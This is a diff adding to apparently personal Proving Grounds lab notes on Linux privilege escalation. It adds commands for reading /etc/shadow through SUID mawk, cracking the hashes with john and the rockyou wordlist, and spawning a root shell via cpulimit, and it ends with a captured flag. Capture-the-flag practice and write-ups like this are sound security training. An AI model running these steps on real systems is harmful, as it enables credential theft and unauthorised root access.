@@ -58,4 +58,47 @@ https://gtfobins.github.io/gtfobins/mawk/
 sudo mawk 'BEGIN {system("/bin/sh")}'
 ```
 
+- sudo is not installed
+
 Unfortunately, my time ran out on proving grounds, so i'll have to wait to finish it off. 
+
+```php
+LFILE=file_to_read
+```
+
+```php
+./mawk '//' "$LFILE"
+```
+
+- /etc/shadow
+
+![[Pasted image 20240915075440.png]]
+
+```php
+unshadow passwd.txt shad.txt > unshad.txt
+```
+
+```php
+john --wordlist=/usr/share/wordlists/rockyou.txt unshad.txt
+```
+
+```php
+john <hash file> --show
+```
+
+Waiting for john to crack the password i tried the other attack vector: `usr/bin/cpulimit`
+
+Root exploit 
+https://gtfobins.github.io/gtfobins/cpulimit/
+
+```php
+./cpulimit -l 100 -f -- /bin/sh -p
+```
+
+![[Pasted image 20240915075053.png]]
+
+Flag
+`c1b56f4aa40fb9117e60cead401680e5`
+
+---
+
